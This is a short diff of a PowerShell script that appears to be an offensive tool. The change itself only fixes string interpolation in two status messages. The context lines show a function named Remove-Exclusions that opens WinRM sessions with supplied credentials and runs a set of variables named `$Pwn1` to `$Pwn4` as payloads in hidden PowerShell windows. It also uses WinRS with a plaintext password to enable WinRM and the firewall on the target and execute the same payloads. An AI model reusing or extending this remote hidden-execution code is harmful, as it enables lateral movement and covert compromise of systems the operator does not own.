@@ -256,7 +256,7 @@ function Remove-Exclusions {
         $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 30000
         try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop }
         else { $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null }
-        if($RDP){ Write-Host "[i] $computer: ejecutando payloads por WinRM en una sesion unica.." -ForegroundColor DarkGray }
+        if($RDP){ Write-Host "[i] ${computer}: ejecutando payloads por WinRM en una sesion unica.." -ForegroundColor DarkGray }
         foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { try { if(!$RDP){ throw }
         Invoke-Command -Session $RDP -ScriptBlock { Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-Command',$using:pwn -ErrorAction Stop } -ErrorAction Stop ; Write-Host "[+] Command was executed successfully!" }
         catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red } }}
@@ -274,7 +274,7 @@ function Remove-Exclusions {
         $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force
         if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
         $Host.UI.RawUI.ForegroundColor = 'Blue'
-        Write-Host "[i] $computer: habilitando WinRM/firewall en el destino (1 sola autenticacion WinRS).." -ForegroundColor DarkGray
+        Write-Host "[i] ${computer}: habilitando WinRM/firewall en el destino (1 sola autenticacion WinRS).." -ForegroundColor DarkGray
         WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1> $null
         if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" -ForegroundColor Green } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
 
